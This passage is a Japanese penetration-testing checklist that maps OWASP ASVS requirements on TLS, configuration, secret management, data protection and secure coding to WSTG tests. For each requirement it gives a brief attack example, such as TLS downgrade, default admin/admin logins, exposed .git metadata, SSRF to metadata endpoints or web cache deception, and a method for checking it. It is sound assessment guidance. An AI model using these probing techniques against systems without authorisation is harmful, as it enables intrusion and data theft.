| V11.7.1 | L3 | フルメモリ暗号化で使用中データを保護 | 範囲外 | プラットフォーム/インフラ仕様確認 | - | - | - |
| V11.7.2 | L3 | 最小化と迅速再暗号化（露出時間短縮） | 対応可 | 平文滞留の計測・スナップショット確認 | [WSTG-ATHN-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses)/[MDN: Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)/[RFC 9111](https://www.rfc-editor.org/rfc/rfc9111) | ログアウト直後でもブラウザの戻る操作で機密ページの平文が閲覧可能 | 応答ヘッダ（Cache-Control/Pragma/Expires）と履歴/キャッシュ再現で残存表示を確認し、無効化不備を検出 |

# V12 安全な通信

## V12.1 一般的な TLS セキュリティガイダンス

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V12.1.1 | L1 | TLS1.2/1.3のみ許可し最新を優先 | 対応可 | サーバ/LBのプロトコル一覧・スキャンで検証 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | ダウングレード強要でTLS1.0/SSLv3に接続して盗聴 | スキャン/ハンドシェイクで<1.2が交渉可能かを確認（許容なら検出） |
| V12.1.2 | L2 | 推奨暗号スイートのみ・強力なスイート優先（L3は前方秘匿性必須） | 対応可 | Cipher設定と実測ハンドシェイク確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | RC4/3DESやRSAキー交換のみへネゴシエーションして盗聴/復号 | 実際に弱スイートが選択可能か・PFS無しが採用されるかを確認（可能なら検出） |
| V12.1.3 | L2 | mTLSのクライアント証明書を信頼鎖で厳格検証 | 範囲外 | CRL/OCSP/ポリシーOID検証 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 自己署名/失効済みクライアント証明書でmTLS通過 | 失効/失効応答/信頼鎖/KeyUsage/OIDを満たさない証明書で接続し受理されれば検出 |
| V12.1.4 | L3 | OCSP Stapling等で失効確認を有効化 | 範囲外 | サーバ設定・中間CA対応確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 失効済みサーバ証明書でもStapling無しで受理 | ハンドシェイクにOCSPレスポンス有無/有効性が載るか確認し、失効を検出できない構成なら検出 |
| V12.1.5 | L3 | ECH有効化でSNI等メタデータ秘匿 | 範囲外 | 対応CDN/実装の検証 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 受動盗聴者にClientHelloのSNIが露出し内部FQDNが特定される | ClientHelloに平文SNIが含まれる/ech拡張無しを確認（露出あれば検出） |

## V12.2 外部向けサービスとの HTTPS 通信

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V12.2.1 | L1 | すべての外部HTTP接続でTLSを強制・フォールバック禁止 | 対応可 | HTTP→HTTPS強制/HSTS/リダイレクト検証 | [WSTG-CRYP-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels) | HTTPで資格情報/セッションIDをスニッフィング | HTTP直アクセスが成功/リダイレクト不備/HSTS欠如を確認（成立なら検出） |
| V12.2.2 | L1 | 公的に信頼できる証明書を使用 | 対応可 | 証明書チェーン/SAN/有効期限確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 自己署名/不正CN/SAN不一致証明書でMITM | チェーン/ホスト名/期限/KeyUsageの検証を行い、検証失敗証明書で接続が成立すれば検出 |

## V12.3 一般的なサービス間通信セキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V12.3.1 | L2 | すべてのイン/アウトバウンド接続でTLS等を使用し平文/ダウングレード不可 | 対応可 | SSH/DB/メッセージ基盤/管理系の暗号化確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 内部API/DB接続を平文で盗聴/改竄 | 内部通信でTLS未使用/降格許容を確認（許容なら検出） |
| V12.3.2 | L2 | TLSクライアントはサーバ証明書を検証 | 対応可 | ピンニング/信頼ストア/ホスト名検証 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 内部HTTPクライアントが自己署名MITMプロキシを受容 | 内部リクエストで不正証明書/ホスト名不一致を受理するか検証（受理なら検出） |
| V12.3.3 | L2 | 内部HTTPサービス間もTLS等で暗号化しフォールバック禁止 | 対応可 | サービスディスカバリ/Ingress設定確認 | [WSTG-CRYP-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels) | サービス間HTTPを傍受して機密データ取得 | 内部HTTPが許容/降格可能かを確認（可能なら検出） |
| V12.3.4 | L2 | 内部TLSは信頼できる証明書（社内CA/自己署名は許可リスト化） | 対応可 | 受信側のTrust設定・ローテーション確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 期限切れ/未信頼CAの証明書を受容してMITM成立 | 内部TrustStore/ピンニング/証明書期限検証を行い、不正チェーン受理なら検出 |
| V12.3.5 | L3 | サービス間は強力な相互認証（mTLS/PoP等）とリプレイ耐性 | 範囲外 | サービスメッシュ/証明書管理の検証 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | ベアラー資格情報を奪取して別クライアントから再送し成功 | mTLS/送信者拘束の不在を確認し、盗取資格のリプレイが成功すれば検出 |

# V13 構成

## V13.1 構成ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V13.1.1 | L2 | すべての外部/内部通信先を文書化 | 対応可 | エンドポイント台帳・環境差分の入手と突合 | [WSTG-INFO-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture) | 未文書の外部APIやバックエンド接続経路が露出しSSRF/越境到達に悪用 | 文書と実観測の差分から未登録のエンドポイント・到達経路を特定（リンク解析・強制ブラウジング） |
| V13.1.2 | L3 | 接続上限・到達時の挙動(フォールバック/リカバリ)定義 | 範囲外 | 疑似高負荷で接続枯渇を再現し挙動確認 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | Keep-Alive大量保持や遅延応答で接続枯渇を誘発しフォールバック誤作動 | 低強度の同時接続/遅延でサーバのタイムアウト/再試行/遮断動作が文書と一致しないことを観測 |
| V13.1.3 | L3 | リソース管理(解放/タイムアウト/再試行方針)を文書化 | 対応可 | タイムアウト/リトライ設定の実測・コード確認 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 再試行過多や過長タイムアウトによりリソース占有が継続 | 実通信で応答時間・再送回数を計測し、設計値/文書との差異を確認 |
| V13.1.4 | L3 | 重要シークレットとローテーション計画を文書化 | 範囲外 | Vault運用文書/証跡確認 | [WSTG-CONF-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information) | 古いバックアップ/無参照ファイルから秘密鍵・APIキーが露出 | 公開/配置ディレクトリの残骸・バックアップを列挙し機微情報の混入を確認 |

## V13.2 バックエンド通信構成

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V13.2.1 | L2 | サービス間は個別ID/短期トークン/証明書で相互認証 | 対応可 | mTLS/JWT検証/STS短期発行の確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens) | 共有APIキー固定や長寿命JWTを第三者が流用 | 署名不正/`exp`,`aud`,`iss`不一致のトークンで拒否されること、短寿命/ローテ有無を確認 |
| V13.2.2 | L2 | バックエンドは最小権限アカウントで実行 | 対応可 | RBAC/DB権限/OS権限レビュー | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 読み取り専用想定のDBユーザで更新/DDLが実行可能 | 機能を通じた最小操作で更新系が通るかを確認（権限逸脱の兆候） |
| V13.2.3 | L2 | デフォルトクレデンシャル不使用 | 対応可 | 既定ID/パスの総当たり確認 | [WSTG-AUTHN-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials) | `admin/admin` 等の既定認証情報でログイン成功 | 代表的な既定組合せで認証通過の有無を確認（ロック/警告も観測） |
| V13.2.4 | L2 | 外部到達の許可リスト化(送信/読込/FS) | 対応可 | egress FW/アウトバウンドACL検証 | [WSTG-INPV-19](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) | メタデータエンドポイントや内部HTTPへの到達（SSRF横展開） | サーバ側からの外部/内部宛リクエスト試行でブロック/許可の実挙動を確認 |
| V13.2.5 | L2 | Web/アプリサーバの送信先を許可リスト化 | 対応可 | サーバ側の送信制御/SELinux/AppArmor確認 | [WSTG-INPV-19](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) | 任意ホスト指定で内部DNS/HTTP資産へ到達 | SSRF系エンドポイントに対し内部/外部宛の疎通可否を観測し制御の有無を確認 |
| V13.2.6 | L3 | 接続並列数/TO/再試行/上限時挙動を構成通り実装 | 範囲外 | Chaos/限界試験でドキュメント通りか検証 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | タイムアウト未設定/再試行過多で復旧遅延や連鎖障害 | 軽度の同時接続・遅延で再試行/遮断/復旧の各挙動が仕様と一致するかを計測 |

## V13.3 シークレット管理

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V13.3.1 | L2 | Vault等で安全に生成/保管/AC/廃棄(コード同梱禁止) | 対応可 | リポジトリ露出検査・ランタイム取得経路確認 | [WSTG-CONF-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage) | 誤公開S3/Blobバケットや公開リンクから資格情報が取得可能 | ストレージのACL/リスト可否/直参照を検証し機微情報の露出有無を確認 |
| V13.3.2 | L2 | シークレットへのアクセスは最小権限 | 対応可 | Vaultポリシー/監査ログの検証 | [WSTG-CONF-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage) | 読み取り不要なロールでシークレット取得が可能 | 低権限トークン/ロールでの取得試行が許容されるかを確認 |
| V13.3.3 | L3 | すべての暗号操作は隔離モジュールで実施 | 範囲外 | 署名/復号の実行場所トレース | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | アプリプロセス内で鍵素材が平文展開され取得される | 実行時の設定/プロセス境界を確認し鍵取扱いがプラットフォーム分離かを検証 |
| V13.3.4 | L3 | 文書化された失効/ローテーションを実運用 | 範囲外 | 有効期限/自動ローテーション実証 | [WSTG-CONF-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage) | 失効されていない古いキー/トークンが依然有効 | 期限切れ後/ローテ後の旧資格情報でアクセス不可になることを確認 |

## V13.4 意図しない情報漏洩

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V13.4.1 | L1 | .git/.svn等のメタデータ非公開 | 対応可 | 既知パス列挙/誤公開検査 | [WSTG-INFO-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage) | `.git/HEAD` や `.svn/entries` の露出でソース取得 | 既知メタパスへのアクセスで取得可否を確認（レスポンスコード/内容を検証） |
| V13.4.2 | L2 | 本番でデバッグ無効 | 対応可 | ヘッダ/フラグ/スタックトレース確認 | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | 例外時に詳細スタック/設定値が露出 | 異常入力でエラーページを発生させ詳細出力の有無を確認 |
| V13.4.3 | L2 | ディレクトリリスティング無効 | 対応可 | 典型パスで列挙可否確認 | [WSTG-CONF-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission) | `/assets/` 等への直アクセスでリストが表示 | 既知ディレクトリ直参照でリスト表示/403/404の挙動を確認 |
| V13.4.4 | L2 | HTTP TRACE 無効 | 対応可 | TRACEメソッド試験 | [WSTG-CONF-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods) | TRACE許可によりXSTでCookie/ヘッダ反射 | `TRACE` 要求に対する応答コード/ボディで有効/無効を確認 |
| V13.4.5 | L2 | ドキュメント/監視エンドポイント非公開 | 対応可 | /swagger,/actuator等の公開範囲確認 | [WSTG-CONF-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces) | 認証なしの `/swagger` や `/actuator` から内部情報取得 | 既知管理UI/監視エンドポイントへの直接アクセスで認可要否/情報量を確認 |
| V13.4.6 | L3 | バックエンド詳細バージョン非表示 | 対応可 | バナー/ヘッダ/エラー文言確認 | [WSTG-INFO-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server) | `Server:` などのバナーから種別/版数が露出 | レスポンスヘッダ/デフォルトエラーページの表記から指紋が取得できるか確認 |
| V13.4.7 | L3 | 処理対象拡張子を許可リスト化 | 範囲外 | 任意拡張子のアップロード/配信実験 | [WSTG-CONF-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information) | `.php/.jsp` を画像名に偽装して実行/解釈される | 拡張子・MIMEの整合を崩したファイルでアップロード/配信時の取り扱いを確認 |

# V14 データ保護

## V14.1 データ保護ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V14.1.1 | L2 | 機密データの特定・分類（Base64/JWT含む） | 対応可 | データフロー図/DBスキーマ/APIレスポンスから機密項目棚卸 | [WSTG-INFO-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture) | JWTや個人情報がURL/Referer/ログに流出 | 画面/API/ログを横断してデータ流路をマッピングし、機密値がURL・ログ・バックアップ等に現れる箇所を特定 |
| V14.1.2 | L2 | 保護要件（暗号/完全性/保持/ログ/DB暗号/プライバシー）の文書化 | 対応可 | 要件トレーサビリティ確認・サンプル設定の実地検証 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Testing_for_Application_Platform_Configuration) | 弱TLS/不適切ログ設定により平文で機密が送受信・記録 | 環境の暗号設定・ログ/監査設定を確認し、要件と実装の乖離（弱い暗号スイート、機密のログ出力等）を検出 |

## V14.2 一般的なデータ保護

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V14.2.1 | L1 | 機密値をURL/クエリに入れない | 対応可 | プロキシ/サーバログでURLパラメータ検査 | [WSTG-SESS-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables) | セッションID/トークン/PIIをGETクエリに含め、Referer/ログ経由で漏洩 | プロキシでリクエストURLとRefererを観測、機密値がクエリ文字列に存在するかを確認 |
| V14.2.2 | L2 | サーバ側キャッシュ/ロードバランサでの機密データ保持抑止 | 対応可 | Cache-Control/ヘッダ/一時ファイルの痕跡確認 | [WSTG-ATHN-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses) | `Cache-Control: no-store` 不備で機密画面がブラウザ/中間でキャッシュ | 機密レスポンスのキャッシュ関連ヘッダ/実挙動（戻る操作・再訪問時の再取得）を確認 |
| V14.2.3 | L2 | 機密データを第三者トラッカーへ送信禁止 | 対応可 | CSP/Requestミラーで送信先解析 | [WSTG-INFO-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage) | 分析タグへメールやユーザIDが自動送信 | DevTools/プロキシで外部ドメインへのリクエストとペイロードを確認し、機密項目の外送を検出 |
| V14.2.4 | L2 | 分類に応じたコントロールを実装（暗号/ログ/PET等） | 対応可 | 設定と実装の差分評価 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Testing_for_Application_Platform_Configuration) | 高分類データが平文ログ/監視基盤へ送信 | 代表トランザクションを実行し、ログ/転送経路の設定が分類に応じた制御になっているかを突合 |
| V14.2.5 | L3 | Web Cache Deception耐性（適正キャッシュ/404/302） | 範囲外 | キャッシュ鍵ずらし/偽拡張子での侵入試験 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion) | `/account` を `account.css` などに偽装し機密ページを共有キャッシュに保存 | パス混乱ペイロードで匿名アクセス時に機密が返る/キャッシュ命中するかを検証 |
| V14.2.6 | L3 | 機密データの最小化・UIマスキング | 対応可 | APIペイロード/画面表示の露出点検 | [WSTG-INFO-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage) | クレジットカード/個人番号が画面/APIで全桁表示 | 画面・APIレスポンスのフィールドを確認し、不要情報・全桁表示・伏字欠如を検出 |
| V14.2.7 | L3 | 保持期間に基づく自動削除 | 範囲外 | スケジュール削除/法定保持の整合確認 | [WSTG-CONF-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information) | 期限超過のバックアップ/エクスポートが公開領域に残置 | 既知拡張子（.bak/.zip等）の列挙と最終更新日の確認で残置データを検出 |
| V14.2.8 | L3 | アップロードファイルのメタデータから機密削除 | 範囲外 | EXIF/Officeメタの除去確認 | [WSTG-INFO-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage) | 画像EXIFにGPS/端末情報、Officeに著者/組織名が残存 | 保存後にダウンロードしメタ情報を解析、機密メタが残る場合は不備と判定 |

## V14.3 クライアントサイドのデータ保護

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V14.3.1 | L1 | セッション終了時のクライアントストレージ/DOMの認証情報クリア | 対応可 | ログアウト後のストレージ/メモリ観測 | [WSTG-CLNT-12](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage) | ログアウト後も`localStorage`にアクセストークンが残存し再利用 | ログアウト後にストレージ/DOMの残留データを確認し、再認証なしでAPIが呼べるか検証 |
| V14.3.2 | L2 | 機密データのブラウザキャッシュ防止ヘッダ | 対応可 | Cache-Control: no-store 等の有効性確認 | [WSTG-ATHN-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses) | 戻るボタンで機密ページが再表示/キャッシュ命中 | 機密レスポンスのキャッシュ関連ヘッダと履歴操作時の再取得挙動を確認 |
| V14.3.3 | L2 | ブラウザストレージへ機密格納禁止（セッショントークン除く） | 対応可 | local/session/IndexedDB/Cookieを動的点検 | [WSTG-CLNT-12](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage) | `localStorage`やIndexedDBにPII/トークンを保存しXSSで窃取 | DevToolsのApplicationパネル/スクリプトで格納を確認し、窃取→API利用の可否でリスク確証 |

# V15 セキュアコーディングとアーキテクチャ

## V15.1 セキュアコーディングとアーキテクチャドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V15.1.1 | L1 | 脆弱なサードパーティの修復SLAを文書化 | 対応可 | 依存関係CVEと修復実績の突合 | [WSTG-INFO-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework) | 既知脆弱ライブラリ（例：古いログ集約ライブラリ）悪用によるRCE/情報漏えい | フレームワーク指紋と版数の特定→CVE照合→安全環境で挙動再現の有無 |
| V15.1.2 | L2 | SBOM/信頼リポジトリからの取得 | 対応可 | SBOM提出・署名/出所検証 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 依存攪乱（typosquatting）や供給元なりすましにより悪性パッケージ取得 | 取得元URL/署名/lockファイルの一貫性確認、ビルドログから出所追跡 |
| V15.1.3 | L2 | 高負荷/重処理の特定と防御方針 | 対応可 | 負荷機能のDOS耐性テスト | [WSTG-BUSL-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_Of_Times_A_Function_Can_Be_Used_Limits) | 高コスト検索やエクスポートの連続呼び出しで枯渇/遅延誘発 | 制限回数超過や短時間多発で拒否/遅延/アラートの有無を観測 |
| V15.1.4 | L3 | リスクのあるコンポーネントを明示 | 範囲外 | 使途・影響範囲の棚卸 | [WSTG-INFO-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework) | EOLコンポーネントからの既知脆弱性悪用 | 指紋→EOL/脆弱性一覧照合→影響資産の抽出 |
| V15.1.5 | L3 | 危険な機能の使用箇所を明示 | 範囲外 | 逆シリアライズ/動的実行等の洗出し | [WSTG-INPV-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection) | サーバサイドの評価関数/テンプレート式を悪用したコード実行 | コード/テンプレ式/ペイロード投入で挙動変化（無害化環境）を確認 |

## V15.2 セキュリティアーキテクチャと依存関係

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V15.2.1 | L1 | 修復SLA違反の依存を本番に含めない | 対応可 | 既知脆弱版の有無チェック | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 脆弱版依存の残存により既知RCE/情報漏えい | SBOM/manifestと実行環境を照合し脆弱版の存在と露出面を確認 |
| V15.2.2 | L2 | 重処理による可用性喪失対策を実装 | 対応可 | レート制限/バルク操作検証 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | バルク更新/連続予約で資源占有し他ユーザを阻害 | 軽負荷の範囲でレート上げ→拒否/バックオフ/隔離の有無観測 |
| V15.2.3 | L2 | 本番に不要物(テスト/サンプル)除外 | 対応可 | ルート/静的配下探索 | [WSTG-CONF-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information) | バックアップやサンプルの露出からソース/秘密情報漏えい | 既知パス列挙で`.bak/.old/backup`やサンプルの直参照可否を確認 |
| V15.2.4 | L3 | 想定リポジトリのみ取り込み(依存攪乱対策) | 範囲外 | 依存解決ログ/lockの検証 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 悪性ネーム空間からの依存混入で任意コード実行 | lock/署名/レジストリURLの許可リスト照合と差分検出 |
| V15.2.5 | L3 | 危険/リスク部位をサンドボックス等で隔離 | 範囲外 | 権限分離/ネット分離の実証 | [WSTG-CONF-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission) | 権限分離不備でWeb経由に内部ファイル/鍵へ到達 | 実効ユーザ/ファイル権限/実行権検証で越権アクセスの可否確認 |

## V15.3 防御的コーディング

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V15.3.1 | L1 | 必要フィールドのみ返却(最小化) | 対応可 | APIレスポンス差分/過剰情報検出 | [WSTG-INFO-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage) | 個人情報や内部ID/フラグが不要に露出 | 画面/APIレスを収集し想定最小セットとの差分で漏えい検出 |
| V15.3.2 | L2 | バックエンドの外部URL追従を抑止 | 対応可 | 自動リダイレクト無効の検証 | [WSTG-INPV-19](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_SSRF) | リダイレクト/画像取得の自動追従で内網/メタデータに到達 | 内部アドレス/メタデータURLを指定し到達可否・外向き通信の制限確認 |
| V15.3.3 | L2 | マスアサインメント防御(許可リスト) | 対応可 | 更新可能フィールドの強制検証 | [WSTG-INPV-20](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment) | `role`/`isAdmin`/`price`等の不許可フィールド上書き | 隠し/未表示フィールドを送信し更新反映の有無を確認 |
